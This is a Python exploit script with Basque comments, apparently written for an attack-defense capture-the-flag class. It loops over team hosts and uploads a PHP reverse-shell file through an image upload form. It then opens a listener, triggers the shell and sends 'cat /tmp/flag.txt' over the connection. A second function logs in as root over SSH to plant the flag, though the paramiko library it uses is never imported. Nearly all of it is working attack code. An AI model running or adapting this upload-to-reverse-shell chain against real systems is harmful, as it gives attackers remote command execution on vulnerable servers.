import requests
import webbrowser
import socket
import time

def flag_eskuratu(url, file_path):
    files = {'file': open(file_path, 'rb')}  
    data = {
        'submit': 'Upload',
    }
    print("[+] PHP artxiboa igotzen..")
    response = requests.post(url, files=files, data=data)

    if response.status_code == 200:
        print("[+] Artxiboa ondo igo da.")
    else:
        print(f"[-] Errorea artxiboa igotzen. Errore kodea: {response.status_code}")
    files['file'].close()

    # Reverse shellaren datuak (PHP artxiboarekin bat datoz)
    ip = '172.17.0.1'
    port = 1234

    # Konexioa gauzatuko den portuan entzuten hasi
    print(f"[+] Konexioak entzuten {ip}:{port}...")
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((ip, port))
    server_socket.listen(1)

    #php artxiboa ireki. Nabigatzailetik ondo egiten du, requests erabilita arazoa ematen zidan

    
    execution_url = 'http://localhost:8080/uploads/reverse_shell.php' 
    webbrowser.open_new(execution_url)

    # Konexioa onartu
    client_socket, client_address = server_socket.accept()
    print(f"[+] Konexioa gauzatu da hemendik:  {client_address}.")


    # /tmp/flag.txt irakurtzeko komandoa bidali
    flag_command = 'cat /tmp/flag.txt\n'
    client_socket.send(flag_command.encode())

    # Artxiboaren erantzuna irakurri
    response = client_socket.recv(4096)
    flag = response.decode()
    print(f"[+] /tmp/flag.txt artxiboaren edukia: {flag}")

    # Cerrar la conexión
    client_socket.close()
    server_socket.close()
    print("[+] Konexioa itxita.")
    return flag

def connect_ssh_submission(ip, username, content):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    #  HEMEN KEYA non dago?
    rsa_key = paramiko.RSAKey.from_private_key_file(f'/home/xza/Documents/repoak/ctf-gameserver-terraform/proxmox/output/team2/team2-sshkey')
    try:
        client.connect(ip, username = username, pkey=rsa_key)
        stdin, stdout, stderr = client.exec_command('mkdir -p /root && echo "{}" > /root/xxx.flag'.format(content))
        # SSH connection cleanup
        client.close()
    except (paramiko.AuthenticationException, paramiko.SSHException) as e:
        print("Error: ", e)



# Example usage:
port = 8080
team_count = 2
ip_mask = '10.0.%d.101'

while True:
    for team_number in range(1, team_count+1):
        ip = ip_mask % team_number
        url = 'http://'+ip+':8080/irudiak.php'
        file_path = '/home/isard/Escritorio/klasearenJarraipena/er-def-ctf-zerbitzuen-garapena-eta-hedapena-iugarteburu/konektatu/exploit/reverse_shell.php'  # Cambia esto a la ruta del archivo PHP en tu máquina local
        content = flag_eskuratu(url,file_path)
        if content is None:
            print("Team", team_number, " NOT successfully connected and authenticated.")
        else:
            print("Team: ", team_number, "\nContent: ", content,)
            # connect_ssh_submission ('10.0.5.1','root',content)
